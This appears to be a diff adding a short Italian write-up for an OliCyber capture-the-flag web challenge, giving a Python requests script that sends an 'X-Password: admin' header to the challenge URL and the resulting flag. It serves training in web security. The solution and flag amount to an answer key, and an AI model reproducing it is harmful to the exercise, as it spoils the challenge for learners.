@@ -1,0 +1,17 @@
+Creare una lista con l'header X-Password e la password "admin" e inserirla, insieme all'url a cui fare richiesta, come parametro nella funzione requests.get.
+
+
+Script:
+
+import requests
+
+url = "http://web-03.challs.olicyber.it/flag"
+
+headers = {"X-Password": "admin"}
+
+risposta = requests.get(url, headers=headers)
+
+print(risposta.text)
+
+
+Flag = flag{7ru57_m3_i_m_7h3_4dmin}
